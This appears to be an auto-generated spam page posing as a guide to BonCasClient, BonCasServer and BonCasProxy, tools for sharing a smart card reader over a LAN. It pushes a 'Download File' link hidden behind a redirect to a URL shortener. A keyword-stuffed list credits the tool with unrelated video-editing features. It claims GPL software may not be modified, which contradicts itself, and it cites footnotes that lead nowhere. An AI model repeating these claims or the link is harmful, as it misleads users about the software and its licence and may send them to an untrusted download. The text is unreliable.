# How to use BonCasClient(1.1.1).zip to share a smart card reader over LAN
 
BonCasClient(1.1.1).zip is a file that contains a DLL that implements a client interface for BonCasLink, a system that allows you to share a smart card reader over LAN. BonCasLink consists of BonCasServer, BonCasService and BonCasProxy, which are also included in the zip file[^1^].
 
**Download File ☆ [https://www.google.com/url?q=https%3A%2F%2Fbyltly.com%2F2uMHWL&sa=D&sntz=1&usg=AOvVaw1VuXmLd1y9eRHPfyH0OhTN](https://www.google.com/url?q=https%3A%2F%2Fbyltly.com%2F2uMHWL&sa=D&sntz=1&usg=AOvVaw1VuXmLd1y9eRHPfyH0OhTN)**


 
BonCasClient is recommended for software that uses a smart card reader, such as TVTest, because it can decrypt scrambled signals more stably than BonCasProxy[^2^]. BonCasClient's bit size (32bit or 64bit) must match the software that uses it, otherwise the library loading will fail and the decryption will fail[^2^]. However, BonCasClient and BonCasLink can have different bit sizes because they communicate via TCP[^2^].
 
To use BonCasClient, you need to download the file from [here](http://www2.wazoku.net/2sen/dtvvup/source/BonCasClient%20%281.1.1%29.zip) and extract it to the same folder as the software that uses it. You also need to install the Microsoft Visual C++ 2019 Redistributable Package for your bit size[^2^]. You can configure the connection destination by creating a BonCasClient.ini file in the same folder as the DLL, or by using the SetConfig function in the DLL[^1^].
 
BonCasLink is licensed under GPL, which means you can freely attach or incorporate it into your own software, but you must disclose the source code[^2^]. You are not allowed to modify the source code or the communication protocol[^2^]. For more details, please refer to the original Readme files in the zip file[^1^] [^2^].
 
BonCasClient latest version download,  How to install BonCasClient on Windows 10,  BonCasClient 1.1.1 zip file size and checksum,  BonCasClient troubleshooting guide,  BonCasClient alternative software,  BonCasClient review and rating,  BonCasClient license and terms of use,  BonCasClient compatibility with other programs,  BonCasClient update history and changelog,  BonCasClient user manual and tutorial,  BonCasClient features and benefits,  BonCasClient security and privacy,  BonCasClient support and feedback,  BonCasClient free trial and discount,  BonCasClient system requirements and specifications,  BonCasClient download link and mirror sites,  BonCasClient error messages and solutions,  BonCasClient tips and tricks,  BonCasClient FAQ and Q&A,  BonCasClient forum and community,  BonCasClient source code and development,  BonCasClient for Mac and Linux,  BonCasClient vs other video capture software,  BonCasClient testimonials and case studies,  BonCasClient awards and recognition,  How to uninstall BonCasClient completely,  How to use BonCasClient with OBS Studio,  How to record streaming video with BonCasClient,  How to edit video with BonCasClient,  How to convert video with BonCasClient,  How to share video with BonCasClient,  How to optimize video quality with BonCasClient,  How to customize settings with BonCasClient,  How to schedule recording with BonCasClient,  How to capture audio with BonCasClient,  How to add watermark with BonCasClient,  How to crop video with BonCasClient,  How to rotate video with BonCasClient,  How to merge video with BonCasClient,  How to split video with BonCasClient,  How to add subtitles with BonCasClient,  How to add effects with BonCasClient,  How to zoom video with BonCasClient,  How to speed up or slow down video with BonCasClient,  How to trim video with BonCasClient,  How to mute audio with BonCasClient,  How to extract audio from video with BonCasClient,  How to compress video with BonCasClient,  How to burn video to DVD with BonCasClient
  
## How to use BonCasServer to share a smart card reader over LAN
 
BonCasServer is a program that runs on the PC where the smart card reader is connected. It acts as a server that accepts requests from BonCasClient or BonCasProxy over TCP and forwards them to the smart card reader. It also sends back the responses from the smart card reader to the client[^1^].
 
To use BonCasServer, you need to download the file from [here](http://www2.wazoku.net/2sen/friioup/source/up1085.zip) and extract it to any folder. You also need to install the Microsoft Visual C++ 2019 Redistributable Package for your bit size[^1^]. You can run BonCasServer.exe and configure the port number and other settings in the dialog box. You can also run BonCasService.exe as a Windows service that runs in the background[^1^].
 
BonCasServer is licensed under GPL, which means you can freely attach or incorporate it into your own software, but you must disclose the source code[^1^]. You are not allowed to modify the source code or the communication protocol[^1^]. For more details, please refer to the original Readme files in the zip file[^1^].
  
## How to use BonCasProxy to share a smart card reader over LAN
 
BonCasProxy is a program that runs on the PC where you want to use a smart card reader that is connected to another PC over LAN. It acts as a proxy that intercepts the WinSCard API calls from the application that uses the smart card reader and redirects them to BonCasLink's client implemented in BonCasStub.dll. It also receives the responses from BonCasLink's server and passes them back to the application[^1^].
 
To use BonCasProxy, you need to download the file from [here](http://www2.wazoku.net/2sen/friioup/source/up1085.zip) and extract it to any folder. You also need to install the Microsoft Visual C++ 2019 Redistributable Package for your bit size[^1^]. You can run BonCasProxy.exe and configure the IP address and port number of BonCasLink's server in the dialog box. You can also click on the tray icon and select "Client Settings" from the menu[^1^].
 
BonCasProxy is licensed under GPL, which means you can freely attach or incorporate it into your own software, but you must disclose the source code[^1^]. You are not allowed to modify the source code or the communication protocol[^1^]. For more details, please refer to the original Readme files in the zip file[^1^].
 8cf37b1e13
 
